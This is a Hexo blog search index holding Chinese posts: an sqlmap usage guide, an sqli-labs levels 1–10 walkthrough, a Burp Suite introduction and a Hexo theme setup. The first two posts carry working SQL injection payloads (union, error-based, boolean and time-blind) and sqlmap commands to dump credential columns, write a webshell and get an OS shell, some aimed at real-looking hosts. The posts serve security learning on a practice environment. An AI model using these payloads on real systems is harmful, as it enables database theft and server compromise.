<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2022/04/04/sqlmap%E5%AE%89%E8%A3%85+%E5%BA%94%E7%94%A8/"/>
    <url>/2022/04/04/sqlmap%E5%AE%89%E8%A3%85+%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>salmap是渗透中常用的注入工具。其实现原理与手工注入操作基本一致。</p><p><strong>sqlmap简介</strong></p><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li><li>联合查询注入，可以使用union的情况下的注入。</li><li>堆查询注入，可以同时执行多条语句的执行时的注入。</li></ol><p><strong>sqlmap支持的数据库</strong></p><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><h1 id="sqlmap安装"><a href="#sqlmap安装" class="headerlink" title="sqlmap安装"></a>sqlmap安装</h1><p>sqlmap是利用Pyrhon语言写的，所以需要python语言环境。</p><ol><li>安装Python2.7.11（注：需安装2.-3.之间的版本）</li></ol><ul><li><p>下载Python2.7.11 下载地址：<a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></p></li><li><p>version选Windows x86-64 MSI installer</p></li><li><p>下载完，双击程序，一直默认next就OK。安装路径最好不要含中文。出现Finish按钮即安装成功。<br>（注：勾选Add python.exe to Path，则无需手动添加环境变量）</p></li><li><p>打开cmd，输入python -v，输出版本号。输入python，进入交互模式，exit()退出。</p></li></ul><ol start="2"><li>SQLMap</li></ol><ul><li><p>下载地址：<a href="http://sqlmap.org/%E3%80%82%E5%B0%86%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%AE%89%E8%A3%85%E5%8C%85%E8%A7%A3%E5%8E%8B%E5%88%B0sqlmap%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E6%9B%BF%E6%8D%A2Python27%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84salmap%E3%80%82">http://sqlmap.org/。将下载的安装包解压到sqlmap文件夹，替换Python27目录下的salmap。</a></p></li><li><p>在sqlmap文件夹下打开cmd，输入sqlmap.py -h 出现sqlmap标、Options、Target等等即表示安装成功。</p></li></ul><h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><h2 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h2><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a></p><p>默认使用level1检测全部数据库类型</p><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3</p><p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><p>当程序有防get注入的时候，可以使用cookie注入<br>sqlmap -u “<a href="http://www.baidu.com/shownews.asp%E2%80%9D">http://www.baidu.com/shownews.asp”</a> –cookie “id&#x3D;11” –level 2（只有level达到2才会检测cookie）</p><h4 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h4><p>可以使用burpsuite或者temperdata等工具来抓取post包</p><p>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    指定username参数</p><h2 id="注入成功"><a href="#注入成功" class="headerlink" title="注入成功"></a>注入成功</h2><h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 –dbs</p><p>查询有哪些数据库</p><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test –tables</p><p>查询test数据库中有哪些表</p><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test -T admin –columns</p><p>查询test数据库中admin表有哪些字段</p><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</p><p>dump出字段username与password中的数据</p><h3 id="读取写入文件"><a href="#读取写入文件" class="headerlink" title="读取写入文件"></a>读取写入文件</h3><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><p>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br>–file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br>–file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径<br>#示例：<br>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p><p>使用shell命令：</p><p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br>接下来指定网站可写目录：<br>“E:\php\htdocs\dvwa”</p><p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p><h2 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h2><ul><li>–is-dba 当前用户权限（是否为root权限）</li><li>–dbs 所有数据库</li><li>–current-db 网站当前数据库</li><li>–users 所有数据库用户</li><li>–current-user 当前数据库用户</li><li>–random-agent 构造随机user-agent</li><li>–passwords 数据库密码</li><li>–proxy <a href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</li><li>–time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li></ul><hr><p>笔记参考：<br><a href="https://blog.csdn.net/zhongcui8067?type=blog">悬剑网络的博客</a><br><a href="https://blog.csdn.net/qq_33530840?type=blog">i春秋-reverse的博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>sqlmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs漏洞平台靶场练习（1-10）</title>
    <link href="/2022/03/25/Sqil-labs%EF%BC%881-10%EF%BC%89/"/>
    <url>/2022/03/25/Sqil-labs%EF%BC%881-10%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="less-1-GET型注入-单引号-字符型注入"><a href="#less-1-GET型注入-单引号-字符型注入" class="headerlink" title="less-1 GET型注入-单引号-字符型注入"></a>less-1 GET型注入-单引号-字符型注入</h1><ol><li>经过 and 1&#x3D;2测试，页面回显正常，所以不是数值查询</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">127.0.0.1/sqli-labs/Less-1/?<span class="hljs-built_in">id</span>=1 and 1=2 --+<br></code></pre></td></tr></table></figure><ol start="2"><li>下一步，再id后加上’,页面回显不正常，表示可能存在SQL字符注入</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1/sqli-labs/Less-1/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>输入–+将sql后面的语句注释掉，页面回显正常，表示这个地方是单引号字符注入</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1/sqli-labs/Less-1/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><ol start="4"><li>下一步用order by 判断，该表一共有几列数据</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1/sqli-labs/Less-1/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; order by 3--+</span><br></code></pre></td></tr></table></figure><p>order by 3页面回显正常，order by 4回显不正常，说明此表3列</p><ol start="5"><li>下一步 id&#x3D;1改为数据库不存在的id值，比如2333，用union select 1，2，3联合查询语句查看页面是否有显示位。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1/sqli-labs/Less-1/?<span class="hljs-built_in">id</span>=2333<span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p>页面输出了2和3，说明页面有两个显示位</p><ol start="6"><li>下一步用SQL查询语句依次爆破出数据库的数据库名，表明，列名，字段信息</li></ol><ul><li><p>查询数据库名信息的语句<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=861&#39;">http://127.0.0.1/sqli-labs/Less-1/?id=861&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</p></li><li><p>查询security内的所有表名<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=2333&#39;">http://127.0.0.1/sqli-labs/Less-1/?id=2333&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)–+</p></li><li><p>列名<br>select group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’</p></li><li><p>用户名、密码<br>lesect group_concat(password) from security.users<br>lesect group_concat(username) from security.users</p></li></ul><h1 id="less-2-GET型注入-数字型"><a href="#less-2-GET型注入-数字型" class="headerlink" title="less-2 GET型注入-数字型"></a>less-2 GET型注入-数字型</h1><ol><li><p>输入?id&#x3D;-1页面信息变化，说明是数值型注入</p></li><li><p>order by 3页面回显正常，order by 4页面回显不正常，有3列，然后采用来联合查询进行注入（见less-1）</p></li></ol><h1 id="less-3-GET型注入-单引号变型字符型"><a href="#less-3-GET型注入-单引号变型字符型" class="headerlink" title="less-3 GET型注入-单引号变型字符型"></a>less-3 GET型注入-单引号变型字符型</h1><ol><li>页面输入?id&#x3D;2’–+页面回显不正常</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1/sqli-labs/Less-1/?<span class="hljs-built_in">id</span>=2<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>但是输入 ？id&#x3D;2’)–+页面回显正常，说明此处是字符型注入，是以(‘’)方式闭合字符串的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1/sqli-labs/Less-1/?<span class="hljs-built_in">id</span>=2<span class="hljs-string">&#x27;) --+</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>下一步用order by 判断表中有3列数据</p></li><li><p>下一步联合查询，union select 1,2,3判断页面是否有显位 （有）</p></li></ol><!-- 下边的关卡换种方式解析，原理一样 --><h1 id="less-4-GET型注入-双引号字符型"><a href="#less-4-GET型注入-双引号字符型" class="headerlink" title="less-4 GET型注入-双引号字符型"></a>less-4 GET型注入-双引号字符型</h1><p>查看源代码：<br>可以看到页面显示Please input the ID as parameter with number value<br>按它说的在URL分别尝试输入 ?id&#x3D;1  ?id&#x3D;1’ ?id&#x3D;1”<br>发现回显不正常，构建sql语句即可：<br>?id&#x3D;-1)” union select 1,group concat(char(32),username,char(23)),group_concat(char(32)，password,char(32)) from users–+</p><h1 id="less-5-GET型注入-单引号字符型"><a href="#less-5-GET型注入-单引号字符型" class="headerlink" title="less-5 GET型注入-单引号字符型"></a>less-5 GET型注入-单引号字符型</h1><p>查看源代码：<br>可以看到页面显示Please input the ID as parameter with number value</p><p>提示：You are in…，和Less-4不同没有正常输出用户名和密码，我们查看一下index.php种的代码，发现没有输出$row查询结果，因为是双注入！<br>双注入指的是两个嵌套查询，先执行子查询，再执行外面的select。</p><p>总之双注入情况下，当一个聚合函数后面出现group分组语句时，会将一部分查询结果以报错的形式返回。所以这里只能按它给的固定公式查询。<br>sql语句：</p><div class="code-wrapper"><pre><code class="hljs">     (获取数据库名)</code></pre></div><p>?id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select database()),’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p><div class="code-wrapper"><pre><code class="hljs">     (获取表名)</code></pre></div><p>?id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’).’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p><div class="code-wrapper"><pre><code class="hljs">     (查询用户信息)</code></pre></div><p>?id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select concat ws(char(32,44,32),id,username,password)from users limit 1,1),’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p><h1 id="less-6-GET型注入-双引号字符型"><a href="#less-6-GET型注入-双引号字符型" class="headerlink" title="less-6 GET型注入-双引号字符型"></a>less-6 GET型注入-双引号字符型</h1><p>和上面的思路一样，下面不在详细说明。查看源代码，在URL后输入?id&#x3D;1”试着让它报错。回显不正常，是双引号注入，构建语句：<br>?id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select concat ws(char(32,44,32),id,username,password)from users limit 0,1),’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p><h1 id="less-7-GET型注入-导出文件"><a href="#less-7-GET型注入-导出文件" class="headerlink" title="less-7 GET型注入-导出文件"></a>less-7 GET型注入-导出文件</h1><p>输入?id&#x3D;1，回显是”You have an error in your SQL syntax”提示use outfile，outfile固定格式是select A into outfile B ，A是文件内容、数数据库信息，B是文件路径。</p><p>构造swlect * from users into outfile“数据库导入导出数据的目录”，判断是否最高权限。回显正常，说明是最高权限。（注意MySQL 5.7.6版本）</p><h1 id="less-8-GET型注入-布尔型单引号"><a href="#less-8-GET型注入-布尔型单引号" class="headerlink" title="less-8 GET型注入-布尔型单引号"></a>less-8 GET型注入-布尔型单引号</h1><p>输入?id&#x3D;1，回显“you are in…”尝试单引号没有返回，盲注主要分为bool型和时间性，通常涉及到这几个函数:</p><p>length(str)：返回字符串str的长度<br>substr(str,pos,len)：将str从pos位置开始截取len长度的字符返回，需要注意的是这里pos的是从1开始的<br>mid(str,pos,len)：和substr()类似<br>ascii(str)：返回字符串str最左边的acsii码（即首字母的acsii码）<br>ord()：同上，返回acsii码<br>left(str,len)：对字符串str左截取len长度<br>right(str,len)：对字符串str右截取len长度<br>if(a,b,c)：条件判断，如果a为true，返回b，否则返回c</p><p>盲注有个固定式：and ascii(substr(A,1,1))&gt;B，或者and if( ascii(substr(A,1,1))&gt;B ,1,0)，这里的A通常是一个select语句，B则是字符或数字的ascii码， 他们的中心思想都是通过substr等截取函数以二分法的形式 查询 逐个匹配想要的信息，这个过程通常都很耗时，所以建议直接写个盲注脚本来跑</p><p>例如查询数据库名语句：<br>?id&#x3D;1’ and ascii(substr((select database(),1,1)))&gt;114–+</p><p>s的ascii码是115，大于114，结果为true，页面回显正常，依次类推。</p><h1 id="less-9-GET型注入-时间盲注-单引号"><a href="#less-9-GET型注入-时间盲注-单引号" class="headerlink" title="less-9 GET型注入-时间盲注-单引号"></a>less-9 GET型注入-时间盲注-单引号</h1><p>按照代码提示：<br>Please input the ID as parameter with numeric value</p><p>时间型盲注和bool型盲注应用场景不同之处在报错的返回上，从less-8我们知道，输入合法时他会返回正常页面“You are in……”，而非法输入时他没有返回任何东西，于是，我们可以根据这个特点跑盲注，通过他不同的返回页面来判断我们匹配的字符是否正确，而在less-9中合法输入与非合法输入它都返回一个页面，就是You are in…..</p><p>因此我们需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：</p><p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</p><p>这里的意思是，如果数据库名首字母的ascii码大于115，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了，盲注脚本与less-8类似，只需要加入sleep函数即可。</p><h1 id="less-10-GET型注入-时间盲注-双引号"><a href="#less-10-GET型注入-时间盲注-双引号" class="headerlink" title="less-10 GET型注入-时间盲注-双引号"></a>less-10 GET型注入-时间盲注-双引号</h1><p>同理less-9，语句：<br>?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</p>]]></content>
    
    
    
    <tags>
      
      <tag>sqli-labs靶场练习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite 模块简介</title>
    <link href="/2022/03/22/BurpSuite%E7%AE%80%E4%BB%8B/"/>
    <url>/2022/03/22/BurpSuite%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>首先，我们先了解什么是Burp Suite。再了解它有什么功能，这样使用起来就顺滑了。</p><h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><ul><li><p>Burp Suite是一款<strong>集成化的渗透测试工具</strong>，包含了很多功能，可以帮助我们高效地完成对Web应用程序的渗透测试和攻击。</p></li><li><p>Burp Suite由Java语言编写，基于Java自身的跨平台性，使这款软件学习和使用起来更方便。Burp Suite不像其他自动化测试工具，它需要手工配置一些参数，触发一些自动化流程，然后才会开始工作。</p></li><li><p>其实，Burp Suite就是一个抓包、改包的工具</p></li></ul><h1 id="Proxy模块"><a href="#Proxy模块" class="headerlink" title="Proxy模块"></a>Proxy模块</h1><h3 id="Options模块"><a href="#Options模块" class="headerlink" title="Options模块"></a>Options模块</h3><p>用于设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等</p><ol><li>选项一：Proxy Listeners</li></ol><ul><li><p>默认情况下，Burp默认监听127.0.0.1地址8080作为代理服务器</p></li><li><p>要使用这个监听器，需要配置浏览器使用127.0.0.1：8080作为代理服务器</p></li></ul><ol start="2"><li>选项二：Intercept Client Requests</li></ol><ul><li><p>配置拦截规则，设置拦截的匹配规则</p></li><li><p>当Intercept request based on the following rules 为选择状态时，burpsuite会配置列表中的规则进行拦截或转发</p></li><li><p>规则可以为：域名、IP地址、协议、HTTP方法、URL，文件拓展名，参数、cookie、头&#x2F;主题内容、状态代码等</p></li></ul><ol start="3"><li>选项三：Intercept Server Responses</li></ol><ul><li><p>基于服务端配置拦截规则，设置拦截的匹配规则</p></li><li><p>Intercept request based on the following rules 为选中状态时，burpsuite会匹配响应包</p></li></ul><ol start="4"><li>选项四：Response Modification</li></ol><ul><li><p>用于执行响应的自动修改</p></li><li><p>可以使用这些选项来自动修改HTML应用程序响应中匹配的内容</p></li></ul><p>了解更多请见<a href="https://blog.csdn.net/Waffle666/article/details/111083913">渗透测试工具Burp Suite详解</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>BurpSuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>美化Blog主题</title>
    <link href="/2022/03/13/Hexo%E3%80%90fluid%E3%80%91%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
    <url>/2022/03/13/Hexo%E3%80%90fluid%E3%80%91%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>在学习如何美化博客之前，我们先简单回顾一下，博客是如何搭建的</p><h1 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h1><p>这里只是说明步骤，详细可参考<a href="https://www.csdn.net/">CNDS</a></p><p>1.注册GitHub，并建立自己的仓库，用来放置博客</p><p>2.安装git工具，生成SSH添加到GitHub。这里推荐一个B站up主<a href="https://www.bilibili.com/video/BV1mU4y1j72n?spm_id_from=333.337.search-card.all.click">视频搬运崽啊</a>超级详细，包括搭建博客，视频里都有教程</p><p>3.搭建本地环境，安装npm（或者nvm)和node</p><p>4.初始化Hexo、运行、部署</p><p>5.生成markdown文件，写文章并发布</p><h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><p>现在我们开始正式为自己的博客更换主题</p><h3 id="在官网hexo挑选主题"><a href="#在官网hexo挑选主题" class="headerlink" title="在官网hexo挑选主题"></a>在官网<a href="https://hexo.io/themes/">hexo</a>挑选主题</h3><p>我选择的是 <a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid</a>这款主题。这里就拿这个举例啦。</p><h6 id="1-获得主题"><a href="#1-获得主题" class="headerlink" title="1.获得主题"></a>1.获得主题</h6><p>在博客文件夹下，Git Bush Here查看Hexok版本，（hexo -v）确定在5.0.0以上，我的是6.1.0。通过npm直接安装，命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-theme-fluid<br></code></pre></td></tr></table></figure><p>在博客目录下新建_config.fluid.yml，把主题的<a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">_config.yml</a>复制进去</p><h6 id="2-切换主题"><a href="#2-切换主题" class="headerlink" title="2.切换主题"></a>2.切换主题</h6><p>进入Hexo目录，找到_config.yml，指定主题、语言。（这个主题需要修改语言，大部分只需改主题，大家见机行事hh）修改内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">theme: fluid  <br><br>language: zh-CN  <br></code></pre></td></tr></table></figure><h6 id="3-创建【关于】页"><a href="#3-创建【关于】页" class="headerlink" title="3.创建【关于】页"></a>3.创建【关于】页</h6><p>博客目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new page about<br></code></pre></td></tr></table></figure><p>成功后，博客目录下找到 &#x2F;source&#x2F;about&#x2F;index.md，添加 layout 属性。如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">---<br>title: about<br><span class="hljs-built_in">date</span>: 2020-02-23 19:20:33<br>layout: about<br>---<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Hexo-fluid-美化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
